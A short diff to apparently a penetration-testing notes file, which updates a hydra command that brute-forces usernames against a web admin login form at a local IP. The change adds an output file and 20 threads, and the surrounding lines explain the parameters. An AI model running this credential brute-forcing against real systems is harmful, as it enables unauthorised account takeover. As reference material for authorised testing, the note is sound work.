@@ -102,7 +102,7 @@
 	
 # POST form bruteforce using hydra
 
-	1. hydra -vV -L fileList.txt -p randomPassword 192.168.1.3 http-post-form '/admin.php:log=^USER^&pwd=^PASS^&submit=Log+In:F=Invalid username'
+	1. hydra -vV -L fileList.txt -p randomPassword 192.168.1.3 http-post-form '/admin.php:log=^USER^&pwd=^PASS^&submit=Log+In:F=Invalid username' -o results.txt -t 20
 		/admin.php : Location of the post form
 		log=^USER^&pwd=^PASS^&submit=Log+In  : POST parameters
 		F=Invalid username  : Ignore all the responses when the response text contain this 'Invalid username' string
